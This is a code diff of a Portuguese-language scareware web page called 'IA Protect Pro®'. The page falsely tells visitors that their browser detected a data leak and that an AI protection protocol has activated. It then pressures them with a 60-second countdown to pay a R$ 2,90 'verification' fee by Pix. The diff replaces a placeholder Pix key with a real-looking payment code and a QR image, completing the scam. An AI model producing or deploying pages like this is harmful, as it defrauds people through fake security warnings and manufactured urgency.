@@ -1,105 +1,135 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>IA Protect Pro® – Varredura de Segurança</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IA Protect Pro®</title>
   <style>
     body {
+      background-color: #f7f7f7;
       font-family: Arial, sans-serif;
-      background-color: #f8f9fa;
       text-align: center;
       padding: 40px 20px;
     }
+
     .cadeado {
-      font-size: 1.5em;
-      color: #f0b429;
+      font-size: 24px;
     }
+
+    h1 {
+      color: #222;
+      margin-top: 10px;
+    }
+
     .alerta {
       color: red;
       font-weight: bold;
+      margin: 10px 0;
     }
-    .info {
-      margin: 15px 0;
+
+    .navegador {
+      margin-top: 20px;
+    }
+
+    .preco {
       font-size: 18px;
-    }
-    .bold {
+      margin-top: 30px;
       font-weight: bold;
     }
-    .qr {
-      margin: 20px auto;
-      width: 200px;
-    }
-    .copy-btn {
-      background-color: #e0e0e0;
-      border: none;
-      padding: 10px;
-      margin-top: 10px;
-      cursor: pointer;
-      border-radius: 6px;
+
+    .pix-code {
       font-family: monospace;
+      background-color: #eee;
+      padding: 8px;
+      border-radius: 6px;
+      margin-top: 8px;
+      display: inline-block;
     }
+
+    .qr {
+      margin-top: 20px;
+    }
+
     .contador {
-      font-size: 16px;
+      margin-top: 25px;
+      font-size: 14px;
       color: #333;
+    }
+
+    .botao {
       margin-top: 10px;
+      padding: 8px 16px;
+      background-color: #333;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .botao:hover {
+      background-color: #555;
     }
   </style>
 </head>
 <body>
+  <div class="cadeado">🔒 <strong>IA Protect Pro®</strong></div>
+  <h1>Segurança de conexão ativada</h1>
 
-  <div class="cadeado">🔒 IA Protect Pro®</div>
-
-  <h2>Segurança de conexão ativada</h2>
   <p class="alerta">🚨 Vazamento de dados em potencial detectado.</p>
 
-  <p class="info">O navegador <span class="bold" id="browser-name">detectando...</span> ativou automaticamente o protocolo <span class="bold">IA Protect Pro®</span>, com tecnologia baseada em Inteligência Artificial.</p>
-
-  <p class="info">Para concluir a proteção em tempo real e garantir segurança durante sua navegação, realize a autenticação abaixo:</p>
-
-  <p class="info">
-    <span class="bold">Valor único de verificação: R$ 2,90</span>
+  <p class="navegador">
+    O navegador <strong id="navegador">seu navegador</strong> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>,
+    com tecnologia baseada em Inteligência Artificial.
   </p>
 
+  <p>Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
+
+  <p class="preco">💳 Valor único de verificação: R$ 2,90</p>
   <p style="font-size: 13px;">(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
 
-  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126360014BR.GOV.BCB.PIX0111qrfakepixkey" alt="QR Code Pix">
-  
+  <div class="qr">
+    <img src="https://i.imgur.com/SsScMlj.png" alt="QR Code Efi" width="220" height="220" />
+  </div>
+
+  <div class="pix-code" id="pixKey">
+    00020126580014BR.GOV.BCB.PIX01367a97187a-4475-4468-92b5-a8dc1d83aeda52040000530398654042.905802BR5923SUL INTERMEDIACOES LTDA6006ITAJAI62120508IAPROTEC630446DB
+  </div>
+
   <div>
-    <button class="copy-btn" onclick="copiarPix()">00020126360014BR.GOV.BCB.PIX0111qrfakepixkey</button>
+    <button class="botao" onclick="copiarPix()">Copiar código Pix</button>
   </div>
 
   <div class="contador">
-    ⏳ Sua autenticação expira em <span id="timer">60</span> segundos.
+    ⏳ Sua autenticação expira em <span id="tempo">60</span> segundos.
   </div>
 
   <script>
-    // Detectar navegador
-    const navegador = navigator.userAgent;
-    const browserName = navegador.includes("Firefox") ? "Mozilla Firefox" :
-                        navegador.includes("OPR") || navegador.includes("Opera") ? "Opera" :
-                        navegador.includes("Chrome") ? "Google Chrome" :
-                        "seu navegador";
-
-    document.getElementById("browser-name").textContent = browserName;
-
-    // Timer regressivo
-    let tempo = 60;
-    const timerEl = document.getElementById("timer");
-    const intervalo = setInterval(() => {
-      tempo--;
-      timerEl.textContent = tempo;
-      if (tempo <= 0) clearInterval(intervalo);
-    }, 1000);
-
-    // Copiar chave Pix
     function copiarPix() {
-      const chave = "00020126360014BR.GOV.BCB.PIX0111qrfakepixkey";
-      navigator.clipboard.writeText(chave).then(() => {
-        alert("Chave Pix copiada!");
+      const codigo = document.getElementById("pixKey").innerText;
+      navigator.clipboard.writeText(codigo).then(() => {
+        alert("Código Pix copiado com sucesso!");
       });
     }
-  </script>
 
+    function detectarNavegador() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Chrome")) return "Google Chrome";
+      if (ua.includes("Firefox")) return "Mozilla Firefox";
+      if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+      if (ua.includes("Edg")) return "Microsoft Edge";
+      return "Navegador desconhecido";
+    }
+
+    document.getElementById("navegador").innerText = detectarNavegador();
+
+    let segundos = 60;
+    const spanTempo = document.getElementById("tempo");
+    setInterval(() => {
+      if (segundos > 0) {
+        segundos--;
+        spanTempo.innerText = segundos;
+      }
+    }, 1000);
+  </script>
 </body>
 </html>
